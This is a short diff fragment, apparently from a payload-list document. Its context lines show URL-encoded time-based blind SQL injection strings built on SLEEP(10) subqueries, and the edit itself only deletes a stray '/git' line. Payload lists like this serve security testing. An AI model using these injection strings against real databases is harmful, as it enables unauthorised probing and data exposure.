@@ -270,4 +270,3 @@ desc%2c(select*from(select(sleep(10)))a)
 -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
 ```
 
-/git
